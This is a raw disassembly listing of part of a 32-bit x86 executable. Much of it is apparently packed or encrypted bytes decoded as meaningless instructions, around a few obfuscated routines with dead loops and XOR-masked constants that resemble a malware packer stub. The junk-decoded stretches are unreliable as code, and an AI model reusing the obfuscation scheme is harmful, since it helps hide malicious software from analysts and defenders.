  40e600:	mov    edi,ebp
  40e602:	shl    dh,0xb0
  40e605:	push   es
  40e606:	dec    ecx
  40e607:	mov    bh,0x53
  40e609:	sbb    bl,0x95
  40e60c:	in     al,dx
  40e60d:	leave  
  40e60e:	xor    cl,BYTE PTR ds:0xe00d4356
  40e614:	pop    edx
  40e615:	cli    
  40e616:	pmulhuw mm4,QWORD PTR [ecx+0x9]
  40e61a:	popa   
  40e61b:	std    
  40e61c:	test   eax,0x55228794
  40e621:	fdiv   QWORD PTR [edx+ecx*1-0x3de447d9]
  40e628:	sbb    DWORD PTR ds:0x2622e657,eax
  40e62e:	push   0xa096bc87
  40e633:	mov    esp,0x7b4b939a
  40e638:	mov    eax,DWORD PTR [ebp+0x1]
  40e63b:	jle    0x40e642
  40e63d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e63e:	pop    ecx
  40e63f:	dec    eax
  40e640:	mov    dl,0xbc
  40e642:	test   BYTE PTR [edi-0x78],ch
  40e645:	(bad)  
  40e646:	loopne 0x40e632
  40e648:	into   
  40e649:	lods   al,BYTE PTR ds:[esi]
  40e64a:	push   eax
  40e64b:	jge    0x40e658
  40e64d:	cmp    ebx,esp
  40e64f:	inc    edx
  40e650:	in     eax,0x56
  40e652:	mov    esi,0x695a012c
  40e657:	push   ebp
  40e658:	or     dh,BYTE PTR [ecx+ebx*2]
  40e65b:	ds push 0x6c
  40e65e:	inc    edx
  40e65f:	mov    ebp,0xbff99fcc
  40e664:	jge    0x40e68f
  40e666:	neg    BYTE PTR [edx]
  40e668:	jns    0x40e648
  40e66a:	dec    ebx
  40e66b:	add    BYTE PTR [ebx-0x7b64a834],al
  40e671:	mov    esp,0x510ef2e3
  40e676:	add    eax,ecx
  40e678:	or     ah,BYTE PTR [esi+ebx*4]
  40e67b:	jbe    0x40e6e0
  40e67d:	add    DWORD PTR [esi+0x21],edx
  40e680:	bound  edx,QWORD PTR [eax+0x6513090e]
  40e686:	xor    DWORD PTR [edi],edx
  40e688:	or     eax,0x4e3ed246
  40e68d:	and    eax,0xe7788890
  40e692:	pop    esp
  40e693:	add    BYTE PTR [ebx],ch
  40e695:	gs push ecx
  40e697:	jg     0x40e6ca
  40e699:	js     0x40e6fc
  40e69b:	push   esi
  40e69c:	jg     0x40e680
  40e69e:	adc    BYTE PTR [esi],dl
  40e6a0:	xor    BYTE PTR [ebx-0x1d],bh
  40e6a3:	gs jno 0x40e715
  40e6a6:	imul   ecx,DWORD PTR [esi-0x7b],0xffffffd9
  40e6aa:	leave  
  40e6ab:	and    eax,0x6c7a82cc
  40e6b0:	cmp    edi,esi
  40e6b2:	or     al,0xea
  40e6b4:	xchg   esi,eax
  40e6b5:	sbb    ecx,DWORD PTR [esi]
  40e6b7:	ror    DWORD PTR [eax-0x37],0xc0
  40e6bb:	test   BYTE PTR [edx+ebx*1-0x17],ah
  40e6bf:	pop    edx
  40e6c0:	fst    QWORD PTR [esi-0x5d576adb]
  40e6c6:	mov    ebx,0x46559919
  40e6cb:	addr16 retf 
  40e6cd:	mov    esp,0xe18413
  40e6d2:	jge    0x40e6d7
  40e6d4:	sub    al,BYTE PTR [edx]
  40e6d6:	(bad)  
  40e6d7:	adc    ah,bl
  40e6d9:	add    al,0x51
  40e6db:	jle    0x40e709
  40e6dd:	aam    0xcb
  40e6df:	test   eax,0x79e76975
  40e6e4:	and    BYTE PTR [eax],0xb9
  40e6e7:	pusha  
  40e6e8:	loopne 0x40e70b
  40e6ea:	(bad)  
  40e6eb:	push   ebx
  40e6ec:	sub    al,0x29
  40e6ee:	push   edx
  40e6ef:	mov    bh,0x17
  40e6f1:	shl    DWORD PTR [eax+0x17],cl
  40e6f4:	ins    BYTE PTR es:[edi],dx
  40e6f5:	inc    ebp
  40e6f6:	shl    BYTE PTR [edx-0x3c],0xee
  40e6fa:	into   
  40e6fb:	cmp    edx,DWORD PTR [esi]
  40e6fd:	jg     0x40e693
  40e6ff:	mov    bl,0x4f
  40e701:	pop    eax
  40e702:	push   es
  40e703:	push   0xdcda6f0d
  40e708:	jl     0x40e6d3
  40e70a:	push   eax
  40e70b:	mov    bh,0xbe
  40e70d:	out    0xd0,eax
  40e70f:	idiv   DWORD PTR [eax+0x1]
  40e712:	add    eax,0xb99213a7
  40e717:	js     0x40e733
  40e719:	sar    BYTE PTR [ebx-0x5cfec47b],0x13
  40e720:	fmul   QWORD PTR [ecx]
  40e722:	mov    ch,0x34
  40e724:	push   cs
  40e725:	push   esi
  40e726:	or     dl,bh
  40e728:	mov    edx,0x41a5b485
  40e72d:	cmp    esi,0x49
  40e730:	mov    ch,0x2e
  40e732:	cmp    BYTE PTR [eax-0x6e2c81b],dl
  40e738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e739:	in     eax,dx
  40e73a:	xor    eax,0xbdf9b0fa
  40e73f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e740:	pop    ss
  40e741:	test   al,0xdc
  40e743:	xchg   esi,eax
  40e744:	test   eax,0x1936064c
  40e749:	or     ebx,edi
  40e74b:	iret   
  40e74c:	cmp    BYTE PTR [ebx-0x7],dh
  40e74f:	and    BYTE PTR [eax-0x1],0xb9
  40e753:	fbld   TBYTE PTR [esi]
  40e755:	mov    cl,0x3
  40e757:	add    BYTE PTR [edi-0x60],dl
  40e75a:	fldz   
  40e75c:	inc    edx
  40e75d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e75e:	dec    ebx
  40e75f:	sub    DWORD PTR [ebx-0x6],esi
  40e762:	xor    BYTE PTR [ecx],cl
  40e764:	imul   eax,DWORD PTR [esi],0x247dba64
  40e76a:	in     al,dx
  40e76b:	(bad)  
  40e76c:	and    ecx,DWORD PTR [ebp-0x4f8c7b55]
  40e772:	adc    edx,DWORD PTR gs:[ecx-0x87c505d]
  40e779:	loop   0x40e789
  40e77b:	cmp    ecx,DWORD PTR [esi-0x3f]
  40e77e:	dec    eax
  40e77f:	and    DWORD PTR [ebx],ebx
  40e781:	cwde   
  40e782:	retf   0xe835
  40e785:	(bad)  
  40e786:	ins    DWORD PTR es:[edi],dx
  40e787:	dec    eax
  40e788:	rol    edi,0x38
  40e78b:	pop    es
  40e78c:	clc    
  40e78d:	mov    ds:0x244888cf,al
  40e792:	inc    ebx
  40e793:	push   esp
  40e794:	jmp    0x40e803
  40e796:	iret   
  40e797:	int3   
  40e798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e799:	arpl   di,bp
  40e79b:	pushf  
  40e79c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e79d:	out    0xd8,al
  40e79f:	mov    al,0xc3
  40e7a1:	(bad)  
  40e7a2:	and    ebx,esp
  40e7a4:	aaa    
  40e7a5:	bound  esi,QWORD PTR [eax]
  40e7a7:	push   esp
  40e7a8:	shl    DWORD PTR [ebp+0x783269a2],cl
  40e7ae:	push   0xb0f9973
  40e7b3:	xchg   edx,eax
  40e7b4:	sahf   
  40e7b5:	xor    eax,0xf33bd97
  40e7ba:	dec    ebx
  40e7bb:	xchg   ecx,ebp
  40e7bd:	aas    
  40e7be:	dec    edi
  40e7bf:	(bad)  
  40e7c0:	clc    
  40e7c1:	stc    
  40e7c2:	lahf   
  40e7c3:	mov    ebp,0x89d11845
  40e7c8:	ja     0x40e7db
  40e7ca:	jle    0x40e7db
  40e7cc:	rcl    BYTE PTR [edx+edi*2],cl
  40e7cf:	push   0xe6db439b
  40e7d4:	mov    edx,0xd47c26ca
  40e7d9:	test   eax,0x4ceb2971
  40e7de:	loop   0x40e801
  40e7e0:	retf   0xbeb0
  40e7e3:	and    ch,BYTE PTR [ecx+0x5a1dfded]
  40e7e9:	(bad)  
  40e7ea:	(bad)
  40e7ed:	stos   BYTE PTR es:[edi],al
  40e7ee:	aas    
  40e7ef:	idiv   BYTE PTR [esp+ebx*2-0x68ce08c0]
  40e7f6:	fwait
  40e7f7:	stc    
  40e7f8:	test   DWORD PTR [esi+0x7be6118f],ebx
  40e7fe:	sub    DWORD PTR [ebp-0xc],0xfffffff2
  40e802:	xchg   edx,eax
  40e803:	xchg   ebp,eax
  40e804:	imul   ebx,DWORD PTR [ebx+0x6d532949],0xffffffd1
  40e80b:	add    eax,0x890a561b
  40e810:	pop    edx
  40e811:	gs mov dh,ch
  40e814:	or     DWORD PTR [esi+0x18d798f3],ebx
  40e81a:	sbb    ah,cl
  40e81c:	stos   BYTE PTR es:[edi],al
  40e81d:	sahf   
  40e81e:	test   BYTE PTR [bp+si-0x6099],al
  40e823:	(bad)  
  40e824:	aaa    
  40e825:	pop    ebp
  40e826:	xchg   ebp,eax
  40e827:	mov    edi,0xd2381380
  40e82c:	inc    edx
  40e82d:	sub    bh,bh
  40e82f:	or     al,0x1b
  40e831:	adc    edi,DWORD PTR [ebp-0x21]
  40e834:	pop    edx
  40e835:	loop   0x40e831
  40e837:	pop    es
  40e838:	es cdq 
  40e83a:	lods   eax,DWORD PTR ds:[esi]
  40e83b:	mov    ds:0x15645934,eax
  40e840:	pushf  
  40e841:	cwde   
  40e842:	inc    esi
  40e843:	jl     0x40e7cd
  40e845:	fisub  DWORD PTR [ebp+0x21]
  40e848:	and    eax,0x8c773375
  40e84d:	repz mov cl,0x2d
  40e850:	lods   eax,DWORD PTR ds:[esi]
  40e851:	inc    ecx
  40e852:	enter  0x15c0,0xd
  40e856:	call   0x4e88:0xd8e7ba3c
  40e85d:	repz mov WORD PTR [esi+0x8490b6b],es
  40e864:	cmc    
  40e865:	pop    es
  40e866:	cdq    
  40e867:	push   es
  40e868:	out    dx,eax
  40e869:	mov    ebp,0xc3967fef
  40e86e:	mov    ah,0xc1
  40e870:	mov    dl,0x9c
  40e873:	xor    ecx,0xffffff87
  40e876:	test   al,0x2a
  40e878:	xchg   BYTE PTR [ebx-0x79],dh
  40e87b:	mov    cl,0x19
  40e87d:	mov    ds:0x5862c9e2,eax
  40e882:	xchg   edi,eax
  40e883:	xchg   ebp,eax
  40e884:	xchg   edi,eax
  40e885:	test   edx,edi
  40e887:	or     eax,0xbcb0d29
  40e88c:	int    0x64
  40e88e:	inc    esp
  40e88f:	loope  0x40e90d
  40e891:	mov    dh,0x9f
  40e893:	or     dh,dl
  40e895:	add    dl,bl
  40e897:	jmp    0x6e0f:0xc523894e
  40e89e:	add    BYTE PTR [ebp+0x58],bh
  40e8a1:	mov    ecx,edi
  40e8a3:	inc    ecx
  40e8a4:	mov    esi,0x48e7d403
  40e8a9:	rcl    DWORD PTR [ebx],1
  40e8ab:	cpuid  
  40e8ad:	cmp    eax,0xca388941
  40e8b2:	xchg   edx,eax
  40e8b3:	jl     0x40e876
  40e8b5:	pop    esp
  40e8b6:	adc    al,BYTE PTR [eax+0x5]
  40e8b9:	add    ah,bl
  40e8bb:	pop    esi
  40e8bc:	mov    ecx,0xd2d3c19e
  40e8c1:	jae    0x40e896
  40e8c3:	push   es
  40e8c4:	(bad)  
  40e8c5:	cld    
  40e8c6:	pop    esp
  40e8c7:	pushf  
  40e8c8:	fidiv  DWORD PTR [edi-0x745e367a]
  40e8ce:	xchg   esi,eax
  40e8cf:	ins    BYTE PTR es:[edi],dx
  40e8d0:	cmp    BYTE PTR [ebp+0x28],bh
  40e8d3:	loope  0x40e892
  40e8d5:	fdivr  QWORD PTR [ecx+0x39ee7778]
  40e8db:	inc    eax
  40e8dc:	shl    BYTE PTR [esi],1
  40e8de:	repz mov ebx,0x6c362f12
  40e8e4:	pop    ds
  40e8e5:	cmp    BYTE PTR [ecx],ah
  40e8e7:	out    0x61,al
  40e8e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8ea:	out    0x58,al
  40e8ec:	jae    0x40e947
  40e8ee:	cmp    al,0x3b
  40e8f0:	push   esp
  40e8f1:	out    dx,eax
  40e8f2:	inc    ebp
  40e8f3:	retf   
  40e8f4:	or     cl,BYTE PTR [ebx+0x65]
  40e8f7:	pop    ss
  40e8f8:	mov    cl,0xda
  40e8fa:	das    
  40e8fb:	hlt    
  40e8fc:	in     al,0xc9
  40e8fe:	outs   dx,BYTE PTR ds:[esi]
  40e8ff:	and    al,0x2
  40e901:	sbb    dh,bl
  40e903:	mov    ?,ebx
  40e905:	push   es
  40e906:	jbe    0x40e952
  40e908:	add    eax,0xc32851bc
  40e90d:	fadd   QWORD PTR [edx-0x43]
  40e910:	fisub  DWORD PTR [ebx]
  40e912:	(bad)  
  40e913:	ficom  WORD PTR [edi-0x2e]
  40e916:	xchg   ebx,eax
  40e917:	(bad)  
  40e919:	rep lods eax,DWORD PTR ds:[esi]
  40e91b:	and    al,0xb6
  40e91d:	hlt    
  40e91e:	pop    ebp
  40e91f:	sub    al,0x9a
  40e921:	(bad)  
  40e922:	sub    DWORD PTR [ecx+0x78],ebx
  40e925:	es xor eax,0x65e3b2d
  40e92b:	pushf  
  40e92c:	rol    BYTE PTR [ebx+0x5f],0xa6
  40e930:	cmp    al,0xf
  40e932:	add    edi,DWORD PTR [edi+0x0]
  40e935:	pop    esi
  40e936:	adc    dh,BYTE PTR [eax]
  40e938:	icebp  
  40e939:	dec    esi
  40e93a:	mov    esi,0x4f84e5e7
  40e93f:	adc    ah,BYTE PTR [eax+0x1660e7e9]
  40e945:	dec    esi
  40e946:	fcomp  QWORD PTR [ebp-0x2f]
  40e949:	jg     0x40e93d
  40e94b:	mov    esp,esp
  40e94d:	lahf   
  40e94e:	lea    edx,[edi]
  40e950:	stos   BYTE PTR es:[edi],al
  40e951:	leave  
  40e952:	stc    
  40e953:	mov    fs,esi
  40e955:	outs   dx,BYTE PTR ds:[esi]
  40e956:	fidiv  WORD PTR [edx]
  40e958:	xor    edi,DWORD PTR ds:[esi]
  40e95b:	mov    edx,0x1a287fcf
  40e960:	mov    dl,0x4
  40e962:	jnp    0x40e905
  40e964:	and    cl,BYTE PTR [ebp+ecx*2-0x32993bcd]
  40e96b:	out    dx,al
  40e96c:	test   al,0xa8
  40e96e:	cdq    
  40e96f:	xor    cl,BYTE PTR [eax-0x634fe6f2]
  40e975:	cmp    esi,eax
  40e977:	loope  0x40e97b
  40e979:	cdq    
  40e97a:	mov    ecx,DWORD PTR ds:0x47b4275a
  40e980:	push   edx
  40e981:	push   es
  40e982:	pop    ss
  40e983:	push   cs
  40e984:	mov    eax,ds:0xa1c21e36
  40e989:	push   esi
  40e98a:	inc    edi
  40e98b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e98c:	sar    DWORD PTR [eax-0x71],cl
  40e98f:	sti    
  40e990:	sbb    cl,dh
  40e992:	sbb    al,BYTE PTR [ecx]
  40e994:	adc    al,BYTE PTR ds:0x788b7164
  40e99a:	cmp    al,0x8d
  40e99c:	je     0x40e995
  40e99e:	js     0x40e92b
  40e9a0:	xor    al,0x6
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	push   esi
  40eced:	xor    dl,BYTE PTR [eax-0x27]
  40ecf0:	jl     0x40ecbe
  40ecf2:	jl     0x40ed70
  40ecf4:	inc    eax
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	aaa    
  40ecf9:	sbb    al,0xb3
  40ecfb:	push   ss
  40ecfc:	lods   eax,DWORD PTR ds:[esi]
  40ecfd:	push   esi
  40ecfe:	mov    al,ds:0xf452e760
  40ed03:	and    eax,DWORD PTR [edx]
  40ed05:	int3   
  40ed06:	aad    0xb4
  40ed08:	(bad)  
  40ed09:	mov    ecx,0x3758d914
  40ed0e:	pop    ss
  40ed0f:	jecxz  0x40ed87
  40ed11:	xchg   edx,eax
  40ed12:	mov    esi,0xeb24a143
  40ed17:	mov    BYTE PTR [edx+0x34ceb89b],ah
  40ed1d:	xchg   esi,eax
  40ed1e:	sub    DWORD PTR [ebx+eax*2-0x3a],ebp
  40ed22:	fld    DWORD PTR [eax+0x4d]
  40ed25:	sbb    al,0x68
  40ed27:	mov    ah,0x62
  40ed29:	push   ecx
  40ed2a:	adc    al,0xa3
  40ed2c:	pop    ebp
  40ed2d:	jp     0x40eda6
  40ed2f:	sub    DWORD PTR [ebp+0x3028726],ecx
  40ed35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed36:	cwde   
  40ed37:	xor    BYTE PTR [esi+0x39],cl
  40ed3a:	das    
  40ed3b:	sbb    BYTE PTR fs:[esi],0xd0
  40ed3f:	cld    
  40ed40:	hlt    
  40ed41:	rcr    DWORD PTR [ecx+0x44d673fb],1
  40ed47:	std    
  40ed48:	ret    
  40ed49:	rol    ebp,0xa4
  40ed4c:	push   es
  40ed4d:	cmp    ah,bh
  40ed4f:	fucomip st,st(4)
  40ed51:	xor    DWORD PTR fs:[edx-0x3ea1032],edi
  40ed58:	or     DWORD PTR [esi-0x3ea76c1a],edi
  40ed5e:	fdivr  DWORD PTR ds:0x815cb413
  40ed64:	jno    0x40ece6
  40ed66:	ror    BYTE PTR [esp+eiz*8],0x60
  40ed6a:	in     eax,dx
  40ed6b:	(bad)  
  40ed6c:	xor    al,BYTE PTR [eax-0x33]
  40ed6f:	outs   dx,DWORD PTR ds:[esi]
  40ed70:	push   ds
  40ed71:	das    
  40ed72:	pop    esi
  40ed73:	mov    ebx,0x65184e92
  40ed78:	xor    eax,edx
  40ed7a:	and    al,0x2f
  40ed7c:	(bad)
  40ed80:	mov    esi,0x3ec0e41e
  40ed85:	mov    esp,0x23a645d4
  40ed8a:	test   BYTE PTR [edi+ecx*8-0x66],0xe7
  40ed8f:	jg     0x40ed41
  40ed91:	(bad)  
  40ed92:	push   0xffffffe1
  40ed94:	call   0x2a9d:0x713dfb6f
  40ed9b:	pop    edi
  40ed9c:	inc    ecx
  40ed9d:	mov    dh,0x15
  40ed9f:	jbe    0x40ed65
  40eda1:	mov    eax,ds:0xd6e8e1f9
  40eda6:	pop    ebx
  40eda7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eda8:	push   esi
  40eda9:	mov    al,0x90
  40edab:	sub    bl,dh
  40edad:	loope  0x40ed44
  40edaf:	mov    bl,0xd
  40edb1:	iret   
  40edb2:	inc    ebp
  40edb3:	mov    ah,0x6f
  40edb5:	enter  0x6bae,0x4e
  40edb9:	dec    edi
  40edba:	sbb    DWORD PTR [edx],esi
  40edbc:	adc    BYTE PTR [esi-0x1d],al
  40edbf:	mov    al,0xb3
  40edc1:	pop    edi
  40edc2:	cld    
  40edc3:	and    eax,0x7e735db5
  40edc8:	fistp  WORD PTR [edx]
  40edca:	aad    0x0
  40edcc:	add    al,0x26
  40edce:	mov    eax,ds:0x607cd072
  40edd3:	pop    ebp
  40edd4:	push   ds
  40edd5:	mov    edi,0xfacbbb42
  40edda:	test   DWORD PTR [edx+0x2d],eax
  40eddd:	retf   0x66c7
  40ede0:	aad    0x20
  40ede2:	cmp    DWORD PTR [ecx+eiz*1],esi
  40ede5:	cld    
  40ede6:	test   al,0xef
  40ede8:	lahf   
  40ede9:	dec    ebp
  40edea:	sbb    cl,al
  40edec:	pop    ebx
  40eded:	sbb    ch,ah
  40edef:	xchg   esp,eax
  40edf0:	xchg   edx,eax
  40edf1:	lods   al,BYTE PTR ds:[esi]
  40edf2:	fs push edi
  40edf4:	jnp    0x40ee67
  40edf6:	aad    0x59
  40edf8:	push   esi
  40edf9:	(bad)  
  40edfa:	cmc    
  40edfb:	(bad)  
  40edfc:	xor    DWORD PTR [esi-0x15],eax
  40edff:	div    bl
  40ee01:	scas   eax,DWORD PTR es:[edi]
  40ee02:	cmp    eax,0xc642114
  40ee07:	push   ebp
  40ee08:	loopne 0x40edf8
  40ee0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
